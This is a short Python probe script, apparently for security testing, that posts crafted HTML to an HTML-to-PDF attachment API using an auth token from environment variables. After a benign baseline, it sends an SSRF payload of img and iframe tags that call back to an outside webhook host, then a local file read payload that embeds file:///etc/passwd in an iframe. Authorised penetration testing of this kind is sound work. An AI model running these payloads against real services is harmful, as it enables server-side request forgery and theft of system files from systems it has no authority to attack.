import json,subprocess,os,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']; WH=os.environ['WH']
def req(body):
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/attachments/html',
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:8]
# 1. baseline benign
c,b=req({"html":"<h1>zx-benign</h1>","type":"pdf","attachableType":"Narrative","attachableId":"31","fileName":"zx-benign"})
print("benign:",c,b[:300]); print()
# 2. SSRF via img in rendered HTML
html=f'<h1>zx</h1><img src="{WH}/{tag}-img.png"><iframe src="{WH}/{tag}-frame"></iframe>'
c,b=req({"html":html,"type":"pdf","attachableType":"Narrative","attachableId":"31","fileName":"zx-ssrf"})
print("ssrf-html:",c,b[:400]); print()
# 3. local file read via iframe/file
html2='<h1>zx</h1><iframe src="file:///etc/passwd" width="800" height="600"></iframe>'
c,b=req({"html":html2,"type":"pdf","attachableType":"Narrative","attachableId":"31","fileName":"zx-lfi"})
print("lfi:",c,b[:400])
open('/tmp/tag2','w').write(tag)
